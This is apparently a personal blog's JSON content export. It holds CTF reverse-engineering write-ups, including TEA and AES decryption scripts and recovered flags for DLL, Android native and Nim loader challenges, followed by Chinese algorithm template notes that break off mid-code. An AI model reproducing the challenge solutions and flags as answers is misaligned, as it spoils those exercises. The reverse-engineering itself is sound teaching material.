{"meta":{"title":"1ens's blog","subtitle":"","description":"a","author":"1ens","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2022-05-25T03:46:23.885Z","updated":"2022-05-25T03:46:23.885Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一个菜鸡逆向选手"},{"title":"","date":"2022-05-24T15:09:56.842Z","updated":"2022-05-24T15:09:56.842Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"所有分类","date":"2022-05-24T15:02:08.935Z","updated":"2022-05-24T15:02:08.935Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2022-05-24T15:06:34.544Z","updated":"2022-05-24T15:06:34.544Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"big lao","text":"big lao 带带"},{"title":"","date":"2022-05-24T15:03:31.990Z","updated":"2022-05-24T15:03:31.990Z","comments":true,"path":"mylist/index.html","permalink":"http://example.com/mylist/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2022-05-24T15:02:51.734Z","updated":"2022-05-24T15:02:51.734Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"FFunction","slug":"FFunction","date":"2022-07-18T13:47:05.000Z","updated":"2022-07-18T15:10:18.402Z","comments":true,"path":"2022/07/18/FFunction/","link":"","permalink":"http://example.com/2022/07/18/FFunction/","excerpt":"","text":"ida打开my_plugin.dll 在my_plugin.dll的f函数断下，f函数先将第⼀个参数的数值分成2个word，然后tea加密并与第⼆个参数的值⽐较。 第⼀个参数的值是输⼊经过位置变换然后base64 第二个参数 12[+] Dump 0x1ECA101B060 - 0x1ECA101B0B0 (80 bytes) :[0x5C15754C, 0xD1D781E7, 0x501BF173, 0xCB4DB222, 0x215D61F5, 0x3FCA9EE7, 0x7C76B5C7, 0xC7DD8CB9, 0x990D23FA, 0x0BAB1AD3, 0x8E12C932, 0xD307BAF2, 0xE52DD123, 0xFBB68F2C, 0xBDD853E3, 0x892E1E4E, 0x39DD66FA, 0x87FEEC65, 0x307C5E60, 0x340C6C00] tea解密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;windows.h&gt;void Decrypt(UINT32 *v, UINT32 *k)&#123; unsigned long n = 32, sum, y = v[0], z = v[1]; unsigned long delta = 0x79B99E37; sum = delta &lt;&lt; 5; while (n-- &gt; 0) &#123; z += ((y &lt;&lt; 4) + k[2]) ^ (y + sum) ^ ((y &gt;&gt; 5) + k[3]); y += ((z &lt;&lt; 4) + k[0]) ^ (z + sum) ^ ((z &gt;&gt; 5) + k[1]); sum -= delta; &#125; v[0] = y; v[1] = z;&#125;int main()&#123; UINT32 key[4] = &#123;0x0BABEC0FE, 0x0DEADBEEF, 0x0FACEB00C, 0xDEADC0DE&#125;; UINT32 enc[21] = &#123;1544910156, 3520561639, 1344008563, 3410866722, 559768053, 1070243559, 2088154567, 3353185465, 2567775226, 195762899, 2383595826, 3540499186, 3844985123, 4223045420, 3185071075, 2301501006, 970811130, 2281630821, 813456992, 873229312, 0&#125;; Decrypt(enc, key); Decrypt(enc + 2, key); Decrypt(enc + 4, key); Decrypt(enc + 6, key); Decrypt(enc + 8, key); Decrypt(enc + 10, key); Decrypt(enc + 12, key); Decrypt(enc + 14, key); Decrypt(enc + 16, key); Decrypt(enc + 18, key); Decrypt(enc + 20, key); for (int i = 0; i &lt; 20 * 4; i++) &#123; printf(&quot;%02x&quot;, ((char *)enc)[i]); &#125; &#125; 再经过base64解码 1234567891011import base64a=&quot;30014006400460044007500230035008600c400a600e6003600c300930016004300340025004400d7007500250086002600f5006300050083007400e3000500a600840055007400970033001600e500a&quot;import reccc=re.findall(&quot;.&#123;2&#125;&quot;,a)ccc=[int(i,16) for i in ccc]fl=&quot;&quot;for index in range(0,len(ccc),2): fl+=(chr(ccc[index]+ccc[index+1]))print(fl[::-1])print(base64.b64decode(fl[::-1]).decode()) 还原 12345678910flag=&quot;f&#125;l!a!gC&#123;_Ehmtp10ww_erre_tFt1u&quot;print(len(flag))f1=&quot;&quot;f2=&quot;&quot;for index in range(len(flag)): if index%2==0: f1+=flag[index] else: f2+=flag[index]print(f1+f2) 1flag&#123;Emp0wer_F1&#125;!!C_ht1w_rettu 再把后部分逆序 1flag&#123;Emp0wer_F1utter_w1th_C!!&#125; 参考dsctf2022 wp - FW_ltlly - 博客园 (cnblogs.com)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[dll]","slug":"dll","permalink":"http://example.com/tags/dll/"}],"author":"1ens"},{"title":"catchme","slug":"catchme","date":"2022-07-18T04:17:01.000Z","updated":"2022-07-18T04:42:01.542Z","comments":true,"path":"2022/07/18/catchme/","link":"","permalink":"http://example.com/2022/07/18/catchme/","excerpt":"","text":"主要check函数在native层里面 ida打开so文件,findcrypto找到aes加密，定位到主要加密函数 sub_B2A4 先是一个aes然后是base64 很多的反调试，但是可以直接静态解，aes的key和最后的比较函数都经过异或加密 加密函数datadiv_decode2726420793510661260() 123456789a=[0x4F, 0x1C, 0x36, 0x49, 0x09, 0x3A, 0x3F, 0x07, 0x4D, 0x3D, 0x22, 0x39, 0x00, 0x0A, 0x22, 0x25, 0x06, 0x09, 0x01, 0x20, 0x4A, 0x1B, 0x51, 0x51, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]for i in range(len(a)): a[i]^=0x6C print(chr(a[i]),end=&#x27;&#x27;)print(&#x27; &#x27;)b=[0x24, 0x3C, 0x3D, 0x37, 0x36, 0x21, 0x35, 0x26, 0x3F, 0x37, 0x32, 0x2A, 0x72, 0x72, 0x72, 0x72, 0x53, 0x00]for i in range(len(b)): b[i]^=0x53 print(chr(b[i]),end=&#x27;&#x27;) 比较的字符串：#pZ%eVSk!QNUlfNIjemL&amp;w&#x3D;&#x3D; aes的密钥：wonderfulday!!!! 解密得到flag flag{weu&#x2F;.,iopl}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[native] -[android]","slug":"native-android","permalink":"http://example.com/tags/native-android/"}],"author":"1ens"},{"title":"LOADER","slug":"LOADER","date":"2022-07-14T01:21:57.000Z","updated":"2022-07-14T08:33:05.545Z","comments":true,"path":"2022/07/14/LOADER/","link":"","permalink":"http://example.com/2022/07/14/LOADER/","excerpt":"","text":"64位无壳 123456BOOL VirtualProtect( LPVOID lpAddress, // 目标地址起始位置 DWORD dwSize, // 大小 DWORD flNewProtect, // 请求的保护方式 PDWORD lpflOldProtect // 保存老的保护方式); VirtualProtectEx函数可以改变在特定进程中内存区域的保护属性。 独立了一个新的虚拟内存，权限可读可写可执行，作为后面新程序的一个引导，根据后面给的内存地址，将被引导的程序dump下来 无法正常运行，文件头存在问题。（主程序是64位但是文件头 这里修改文件头和可选头的值 主要逻辑为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214int sub_BF2850()&#123; FILE *v0; // rax __int64 v1; // rax _QWORD *v2; // rsi __int64 v3; // rdi __int64 v4; // rdx __int64 v5; // rbx __m128i *v6; // rax __m128i *v7; // rdi __m128i *v8; // rax unsigned __int64 *v10; // rsi __int64 v11; // rbx __int64 v12; // rcx __m128i *input_1; // rbp __int64 v14; // rdx unsigned __int64 v15; // rdi __int64 v16; // rbx unsigned __int64 *len; // rbp __m128i *v18; // rax __int64 v19; // rcx __m128i *input_2; // rdi __int64 v21; // rdx unsigned __int64 v22; // rsi __int64 v23; // rdi __int64 v24; // rdx unsigned __int64 v25; // rcx __m128i v26; // xmm4 __int64 v27; // rdi __int64 v28; // rdx unsigned __int64 v29; // rcx __m128i v30; // [rsp+20h] [rbp-78h] BYREF __m128i v31; // [rsp+30h] [rbp-68h] BYREF __int64 v32; // [rsp+40h] [rbp-58h] BYREF __int64 v33; // [rsp+48h] [rbp-50h] __m128i v34; // [rsp+50h] [rbp-48h] BYREF __int64 v35; // [rsp+60h] [rbp-38h] BYREF __int64 v36; // [rsp+68h] [rbp-30h] nimRegisterGlobalMarker(sub_BF27A0); nimRegisterGlobalMarker(sub_BF2790); nimRegisterGlobalMarker(sub_BF2780); nimRegisterGlobalMarker(sub_BF2770); nimRegisterGlobalMarker(sub_BF2760); nimRegisterGlobalMarker(sub_BF2750); nimRegisterGlobalMarker(sub_BF2740); nimRegisterGlobalMarker(sub_BF2730); nimRegisterGlobalMarker(sub_BF2720); printf_0(off_BF6DC8, 1i64); v0 = (FILE *)off_BF50C0(0i64); v1 = scanf(v0); v2 = (_QWORD *)v1; if ( v1 ) *(_QWORD *)(v1 - 16) += 8i64; if ( input ) &#123; v3 = *(_QWORD *)(input - 16); v4 = input - 16; *(_QWORD *)(input - 16) = v3 - 8; if ( (unsigned __int64)(v3 - 8) &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v4); &#125; input = (__int64)v2; v5 = 0i64; v6 = sub_BE8FC0(5i64); v7 = v6; if ( !v6 ) &#123; if ( v2 ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; if ( !v2 ) &#123; if ( !v6-&gt;m128i_i64[0] ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; do &#123; if ( v6-&gt;m128i_i64[0] &lt;= (unsigned __int64)v5 ) sub_BEC420(v5, v6-&gt;m128i_i64[0] - 1); if ( *v2 &lt;= (unsigned __int64)v5 ) sub_BEC420(v5, *v2 - 1i64); v6[1].m128i_i8[v5] = *((_BYTE *)v2 + v5 + 16); ++v5; &#125; while ( v5 &lt;= 4 ); if ( v6-&gt;m128i_i64[0] != 5 ) goto error; v8 = v6 + 1; if ( v7[1].m128i_i32[0] != &#x27;galf&#x27; ) //判断输入是否为flag goto error; if ( v8-&gt;m128i_i8[4] != &#x27;&#123;&#x27; ) goto error; v10 = (unsigned __int64 *)input; if ( !input || *(_QWORD *)input != 42i64 || *(_BYTE *)(input + 57) != &#x27;&#125;&#x27; )// 判断长度为42位 并且最后一位是&#125; goto error; v11 = 0i64; input_1 = sub_BE8FC0(18i64); if ( !input_1 ) sub_BEC420(0i64, -1i64); do &#123; v14 = input_1-&gt;m128i_i64[0]; if ( input_1-&gt;m128i_i64[0] &lt;= (unsigned __int64)v11 ) sub_BEC420(v11, v14 - 1); // 跳过 v15 = v11 + 5; if ( v11 + 5 &lt; 0 || v15 &lt; v11 ) sub_BE7F70(v12, v14); // 跳过 if ( *v10 &lt;= v15 ) sub_BEC420(v11 + 5, *v10 - 1); // 跳过 input_1[1].m128i_i8[v11++] = *((_BYTE *)v10 + v15 + 16);// 保存我们输入后去除flag&#123;的后18位 &#125; while ( v11 &lt;= 17 ); v16 = 0i64; str2int(input_1, 10i64, &amp;ll_input_1); //将我们的输入转换为了无符号的long long类型的一个数据 len = (unsigned __int64 *)input; v18 = sub_BE8FC0(18i64); input_2 = v18; if ( !v18 ) &#123; if ( len ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; if ( !len ) &#123; if ( !v18-&gt;m128i_i64[0] ) sub_BEC420(0i64, -1i64); sub_BEC420(23i64, -1i64); &#125; do &#123; v21 = input_2-&gt;m128i_i64[0]; if ( input_2-&gt;m128i_i64[0] &lt;= (unsigned __int64)v16 ) sub_BEC420(v16, v21 - 1); v22 = v16 + 23; if ( v16 + 23 &lt; 0 || v22 &lt; v16 ) sub_BE7F70(v19, v21); if ( *len &lt;= v22 ) sub_BEC420(v16 + 23, *len - 1); input_2[1].m128i_i8[v16++] = *((_BYTE *)len + v22 + 16);// 保存后18位 &#125; while ( v16 &lt;= 17 ); str2int(input_2, 10i64, &amp;ll_input_2); str2int(qword_BF6D80, 10i64, &amp;xmmword_C0C150); str2int(qword_BF6D40, 10i64, &amp;max_num); v31 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C150); //大致可以猜测_mm_lodau_si128是将后面的偏移地址处的数据进行加载，那么可以猜测在这个前后应该会有加密部分 v30 = _mm_loadu_si128((const __m128i *)&amp;ll_input_1); if ( !(unsigned __int8)check(&amp;v31, &amp;v30) ) goto error; v31 = _mm_loadu_si128((const __m128i *)&amp;ll_input_1); v30 = _mm_loadu_si128((const __m128i *)&amp;max_num); if ( !(unsigned __int8)check(&amp;v31, &amp;v30) ) goto error; v32 = 0i64; v33 = 0i64; v31 = (__m128i)ll_input_1; v30 = (__m128i)ll_input_1; func_sqr(&amp;v31, &amp;v30, &amp;v32); v23 = v32; if ( v32 ) *(_QWORD *)(v32 - 16) += 8i64; if ( (_QWORD)xmmword_C0C190 ) &#123; v24 = xmmword_C0C190 - 16; v25 = *(_QWORD *)(xmmword_C0C190 - 16) - 8i64; *(_QWORD *)(xmmword_C0C190 - 16) = v25; if ( v25 &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v24); &#125; *(_QWORD *)&amp;xmmword_C0C190 = v23; v34 = 0ui64; BYTE8(xmmword_C0C190) = v33; v31 = (__m128i)ll_input_2; v30 = (__m128i)ll_input_2; func_sqr(&amp;v31, &amp;v30, &amp;v34); v26 = _mm_load_si128(&amp;v34); v35 = 0i64; v36 = 0i64; v31 = v26; func_mul(&amp;v31, 11i64, &amp;v35); v27 = v35; if ( v35 ) *(_QWORD *)(v35 - 16) += 8i64; if ( (_QWORD)xmmword_C0C120 ) &#123; v28 = xmmword_C0C120 - 16; v29 = *(_QWORD *)(xmmword_C0C120 - 16) - 8i64; *(_QWORD *)(xmmword_C0C120 - 16) = v29; if ( v29 &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v28); &#125; *(_QWORD *)&amp;xmmword_C0C120 = v27; v31 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C190); BYTE8(xmmword_C0C120) = v36; v30 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C120); sub_BF23C0(&amp;v31, &amp;v30, &amp;num_9); str2int(qword_BF6D10, 10i64, &amp;xmmword_C0C180); v31 = _mm_loadu_si128((const __m128i *)&amp;num_9); v30 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C180); if ( (unsigned __int8)sub_BF2500(&amp;v31, &amp;v30) ) &#123; qword_BFA660 = 1i64; &#125; else &#123;error: if ( qword_BFA660 != 1 ) return printf_0(off_BF6CC0, 1i64); &#125; return printf_0(win, 1i64);&#125; $$input1^2-11*(input^2)&#x3D;9$$ 大致流程为输入42位的flag。去除flag{}后分为两个18位的数进行上述运算 采用：www.wolframalpha.com/ 进行求解 y是17位前面补上0得到 1flag&#123;118936021352508390035860559716724409&#125;","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[],"author":"1ens"},{"title":"算法-数据结构","slug":"‘算法-数据结构","date":"2022-07-12T00:05:12.000Z","updated":"2022-07-12T06:38:27.751Z","comments":true,"path":"2022/07/12/‘算法-数据结构/","link":"","permalink":"http://example.com/2022/07/12/%E2%80%98%E7%AE%97%E6%B3%95-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","excerpt":"","text":"链表（数组模拟）new一个结构体效率很低 单链表 邻接表为主（存储数和图） 123456789101112131415161718192021// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点int head, e[N], ne[N], idx;// 初始化void init()&#123; head = -1; idx = 0;&#125;// 在链表头插入一个数avoid insert(int a)&#123; e[idx] = a, ne[idx] = head, head = idx ++ ;&#125;// 将头结点删除，需要保证头结点存在void remove()&#123; head = ne[head];&#125; 双链表 优化某些问题 12345678910111213141516171819202122232425// e[]表示节点的值，l[]表示节点的左指针，r[]表示节点的右指针，idx表示当前用到了哪个节点int e[N], l[N], r[N], idx;// 初始化void init()&#123; //0是左端点，1是右端点 r[0] = 1, l[1] = 0; idx = 2;&#125;// 在节点a的右边插入一个数xvoid insert(int a, int x)&#123; e[idx] = x; l[idx] = a, r[idx] = r[a]; l[r[a]] = idx, r[a] = idx ++ ;&#125;// 删除节点avoid remove(int a)&#123; l[r[a]] = l[a]; r[l[a]] = r[a];&#125; 栈1234567891011121314151617// tt表示栈顶int stk[N], tt = 0;// 向栈顶插入一个数stk[ ++ tt] = x;// 从栈顶弹出一个数tt -- ;// 栈顶的值stk[tt];// 判断栈是否为空if (tt &gt; 0)&#123;&#125; 单调栈 1234567常见模型：找出每个数左边离它最近的比它大/小的数int tt = 0;for (int i = 1; i &lt;= n; i ++ )&#123; while (tt &amp;&amp; check(stk[tt], i)) tt -- ; stk[ ++ tt] = i;&#125; 队列普通队列 1234567891011121314151617// hh 表示队头，tt表示队尾int q[N], hh = 0, tt = -1;// 向队尾插入一个数q[ ++ tt] = x;// 从队头弹出一个数hh ++ ;// 队头的值q[hh];// 判断队列是否为空if (hh &lt;= tt)&#123;&#125; 循环队列 12345678910111213141516171819// hh 表示队头，tt表示队尾的后一个位置int q[N], hh = 0, tt = 0;// 向队尾插入一个数q[tt ++ ] = x;if (tt == N) tt = 0;// 从队头弹出一个数hh ++ ;if (hh == N) hh = 0;// 队头的值q[hh];// 判断队列是否为空if (hh != tt)&#123;&#125; 单调队列 12345678常见模型：找出滑动窗口中的最大值/最小值int hh = 0, tt = -1;for (int i = 0; i &lt; n; i ++ )&#123; while (hh &lt;= tt &amp;&amp; check_out(q[hh])) hh ++ ; // 判断队头是否滑出窗口 while (hh &lt;= tt &amp;&amp; check(q[tt], i)) tt -- ; q[ ++ tt] = i;&#125; KMP1234567891011121314151617181920// s[]是长文本，p[]是模式串，n是s的长度，m是p的长度求模式串的Next数组：for (int i = 2, j = 0; i &lt;= m; i ++ )&#123; while (j &amp;&amp; p[i] != p[j + 1]) j = ne[j]; if (p[i] == p[j + 1]) j ++ ; ne[i] = j;&#125;// 匹配for (int i = 1, j = 0; i &lt;= n; i ++ )&#123; while (j &amp;&amp; s[i] != p[j + 1]) j = ne[j]; if (s[i] == p[j + 1]) j ++ ; if (j == m) &#123; j = ne[j]; // 匹配成功后的逻辑 &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"算法基础","slug":"算法基础-快排","date":"2022-07-06T16:00:00.000Z","updated":"2022-07-11T12:39:28.560Z","comments":true,"path":"2022/07/07/算法基础-快排/","link":"","permalink":"http://example.com/2022/07/07/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80-%E5%BF%AB%E6%8E%92/","excerpt":"","text":"快排模板： 12345678910111213141516void quick_sort(int q[], int l, int r)&#123; //递归的终止情况 if(l &gt;= r) return; //第一步：分成子问题 int i = l - 1, j = r + 1, x = q[l + r &gt;&gt; 1]; while(i &lt; j) &#123; do i++; while(q[i] &lt; x); do j--; while(q[j] &gt; x); if(i &lt; j) swap(q[i], q[j]); &#125; //第二步：递归处理子问题 quick_sort(q, l, j), quick_sort(q, j + 1, r); //第三步：子问题合并.快排这一步不需要操作，但归并排序的核心在这一步骤&#125; 例题给定你一个长度为 nn 的整数数列。 请你使用快速排序对这个数列按照从小到大进行排序。 并将排好序的数列按顺序输出。 输入格式输入共两行，第一行包含整数 nn。 第二行包含 nn 个整数（所有整数均在 1∼1091∼109 范围内），表示整个数列。 输出格式输出共一行，包含 nn 个整数，表示排好序的数列。 数据范围1≤n≤1000001≤n≤100000 输入样例：1253 1 2 4 5 输出样例：11 2 3 4 5 解题：1234567891011121314151617181920212223242526272829303132#include&lt;iostream&gt;using namespace std;const int N=1000010;int q[N];void quick_sort(int q[],int l,int r)&#123; if (l&gt;=r)return; int x=q[l+r&gt;&gt;1],i=l-1,j=r+1; while(i&lt;j) &#123; do i++;while(q[i]&lt;x); do j--;while(q[j]&gt;x); if(i&lt;j) swap(q[i],q[j]); &#125; quick_sort(q,l,j); quick_sort(q,j+1,r);&#125;int main()&#123; int n; scanf(&quot;%d&quot;,&amp;n); //scanf比cin速度更快 for (int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); quick_sort (q,0,n-1); for (int i=0;i&lt;n;i++) printf(&quot;%d &quot;,q[i]); return 0;&#125; 归并排序模板 123456789101112131415161718192021void merge_sort(int q[], int l, int r)&#123; //递归的终止情况 if(l &gt;= r) return; //第一步：分成子问题 int mid = l + r &gt;&gt; 1; //第二步：递归处理子问题 merge_sort(q, l, mid ), merge_sort(q, mid + 1, r); //第三步：合并子问题 int k = 0, i = l, j = mid + 1, tmp[r - l + 1]; while(i &lt;= mid &amp;&amp; j &lt;= r) if(q[i] &lt;= q[j]) tmp[k++] = q[i++]; else tmp[k++] = q[j++]; while(i &lt;= mid) tmp[k++] = q[i++]; while(j &lt;= r) tmp[k++] = q[j++]; for(k = 0, i = l; i &lt;= r; k++, i++) q[i] = tmp[k];&#125; 例题同上 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;iostream&gt;using namespace std;const int N=1000010;int q[N],tmp[N];void merge_sort(int q[],int l,int r)&#123; if(l&gt;=r) return; int mid = l + r&gt;&gt;1; merge_sort(q,l,mid); merge_sort(q,mid+1,r); int k=0,i=l,j=mid+1; while(i&lt;=mid &amp;&amp; j&lt;=r) if(q[i]&lt;=q[j]) tmp[k++]=q[i++]; else tmp[k++]=q[j++]; while(i&lt;=mid) tmp[k++]=q[i++]; while(j&lt;=r) tmp[k++]=q[j++]; for (i=l,j=0;i&lt;=r;i++,j++) q[i]=tmp[j]; &#125;int main()&#123; int n;C++ scanf(&quot;%d&quot;,&amp;n); for (int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); merge_sort (q,0,n-1); for (int i=0;i&lt;n;i++) printf(&quot;%d &quot;,q[i]); return 0;&#125; 二分123456789101112131415161718192021222324bool check(int x) &#123;/* ... */&#125; // 检查x是否满足某种性质// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：int bsearch_1(int l, int r)&#123; while (l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if (check(mid)) r = mid; // check()判断mid是否满足性质 else l = mid + 1; &#125; return l;&#125;// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：int bsearch_2(int l, int r)&#123; while (l &lt; r) &#123; int mid = l + r + 1 &gt;&gt; 1; if (check(mid)) l = mid; else r = mid - 1; &#125; return l;&#125; 例题给定一个按照升序排列的长度为 nn 的整数数组，以及 qq 个查询。 对于每个查询，返回一个元素 kk 的起始位置和终止位置（位置从 00 开始计数）。 如果数组中不存在该元素，则返回 -1 -1。 输入格式第一行包含整数 nn 和 qq，表示数组长度和询问个数。 第二行包含 nn 个整数（均在 1∼100001∼10000 范围内），表示完整数组。 接下来 qq 行，每行包含一个整数 kk，表示一个询问元素。 输出格式共 qq 行，每行包含两个整数，表示所求元素的起始位置和终止位置。 如果数组中不存在该元素，则返回 -1 -1。 数据范围1≤n≤1000001≤n≤1000001≤q≤100001≤q≤100001≤k≤100001≤k≤10000 输入样例：123456 31 2 2 3 3 4345 输出样例：1233 45 5-1 -1 exp 在数组中查找某元素，找不到就输出-1，找到了就输出不小于该元素的最小位置和不大于该元素的最大位置。所以，需要写两个二分，一个需要找到&gt;&#x3D;x的第一个数，另一个需要找到&lt;&#x3D;x的最后一个数。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;using namespace std;const int N=1000010;int q[N];int n,m;int main()&#123; scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); while (m--) &#123; int x; scanf(&quot;%d&quot;,&amp;x); int l=0,r=n-1; while (l&lt;r) //找到&lt;=x的第一个数 右边界 &#123; int mid =l+r &gt;&gt;1; if(q[mid]&gt;=x) r=mid; else l=mid+1; &#125; if(q[l]!=x)cout&lt;&lt;&quot;-1 -1&quot;&lt;&lt;endl; else &#123; cout&lt;&lt;l&lt;&lt;&#x27; &#x27;; int l=0,r=n-1; while(l&lt;r) //&gt;=x的最后一个数 左边界 &#123; int mid=l+r+1&gt;&gt;1; if(q[mid]&lt;=x) l=mid; else r=mid-1; &#125; cout&lt;&lt;l&lt;&lt;endl; &#125; &#125; return 0;&#125; 高精1 度减法12345678910111213141516// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0vector&lt;int&gt; sub(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B)&#123; vector&lt;int&gt; C; for (int i = 0, t = 0; i &lt; A.size(); i ++ ) &#123; t = A[i] - t; if (i &lt; B.size()) t -= B[i]; C.push_back((t + 10) % 10); if (t &lt; 0) t = 1; else t = 0; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;&#125; 高精度乘以低精度123456789101112131415// C = A * b, A &gt;= 0, b &gt;= 0vector&lt;int&gt; mul(vector&lt;int&gt; &amp;A, int b)&#123; vector&lt;int&gt; C; int t = 0; for (int i = 0; i &lt; A.size() || t; i ++ ) &#123; if (i &lt; A.size()) t += A[i] * b; C.push_back(t % 10); t /= 10; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back();&#125; 高精度除以低精度12345678910111213141516// A / b = C ... r, A &gt;= 0, b &gt; 0vector&lt;int&gt; div(vector&lt;int&gt; &amp;A, int b, int &amp;r)&#123; vector&lt;int&gt; C; r = 0; for (int i = A.size() - 1; i &gt;= 0; i -- ) &#123; r = r * 10 + A[i]; C.push_back(r / b); r %= b; &#125; reverse(C.begin(), C.end()); while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); r&#125; 前缀和一维 12S[i] = a[1] + a[2] + ... a[i]a[l] + ... + a[r] = S[r] - S[l - 1] 二维 123S[i, j] = 第i行j列格子左上部分所有元素的和以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：S[x2, y2] - S[x1 - 1, y2] - S[x2, y1 - 1] + S[x1 - 1, y1 - 1] 差分一维 1给区间[l, r]中的每个数加上c：B[l] += c, B[r + 1] -= c 二维 12给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c：S[x1, y1] += c, S[x2 + 1, y1] -= c, S[x1, y2 + 1] -= c, S[x2 + 1, y2 + 1] += c ![ 1 ](https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207081703562.png) b[x1][ y1 ] +&#x3D;c ; 对应图1 ,让整个a数组中蓝色矩形面积的元素都加上了c。b[x1,][y2+1]-&#x3D;c ; 对应图2 ,让整个a数组中绿色矩形面积的元素再减去c，使其内元素不发生改变。b[x2+1][y1]- &#x3D;c ; 对应图3 ,让整个a数组中紫色矩形面积的元素再减去c，使其内元素不发生改变。b[x2+1][y2+1]+&#x3D;c; 对应图4,,让整个a数组中红色矩形面积的元素再加上c，红色内的相当于被减了两次，再加上一次c，才能使其恢复。 双指针算法123456789for (int i = 0, j = 0; i &lt; n; i ++ )&#123; while (j &lt; i &amp;&amp; check(i, j)) j ++ ; // 具体问题的逻辑&#125;常见问题分类： (1) 对于一个序列，用两个指针维护一段区间 (2) 对于两个序列，维护某种次序，比如归并排序中合并两个有序序列的操作 离散化12345678910111213141516vector&lt;int&gt; alls; // 存储所有待离散化的值sort(alls.begin(), alls.end()); // 将所有值排序alls.erase(unique(alls.begin(), alls.end()), alls.end()); // 去掉重复元素// 二分求出x对应的离散化的值int find(int x) // 找到第一个大于等于x的位置&#123; int l = 0, r = alls.size() - 1; while (l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if (alls[mid] &gt;= x) r = mid; else l = mid + 1; &#125; return r + 1; // 映射到1, 2, ...n&#125; 例题：假定有一个无限长的数轴，数轴上每个坐标上的数都是 00。 现在，我们首先进行 nn 次操作，每次操作将某一位置 xx 上的数加 cc。 接下来，进行 mm 次询问，每个询问包含两个整数 ll 和 rr，你需要求出在区间 [l,r][l,r] 之间的所有数的和。 输入格式第一行包含两个整数 nn 和 mm。 接下来 nn 行，每行包含两个整数 xx 和 cc。 再接下来 mm 行，每行包含两个整数 ll 和 rr。 输出格式共 mm 行，每行输出一个询问中所求的区间内数字和。 数据范围−109≤x≤109−109≤x≤109,1≤n,m≤1051≤n,m≤105,−109≤l≤r≤109−109≤l≤r≤109,−10000≤c≤10000−10000≤c≤10000 输入样例：12345673 31 23 67 51 34 67 8 输出样例：123805 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;typedef pair&lt;int, int&gt; PII;const int N = 300010;int a[N], s[N];int n, m;vector&lt;int&gt; alls;vector&lt;PII&gt; add, query;int find(int x)&#123; int l = 0, r = alls.size() - 1; while(l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if(alls[mid] &gt;= x) r = mid; else l = mid + 1; &#125; return r + 1;&#125;vector&lt;int&gt;:: iterator unique(vector&lt;int&gt; &amp;a)&#123; int j = 0; for(int i = 0; i &lt; a.size(); i ++) if(!i || a[i] != a[i - 1]) a[j ++ ] = a[i]; return a.begin() + j;&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; m; for(int i = 0; i &lt; n; i ++ ) &#123; int x, c; cin 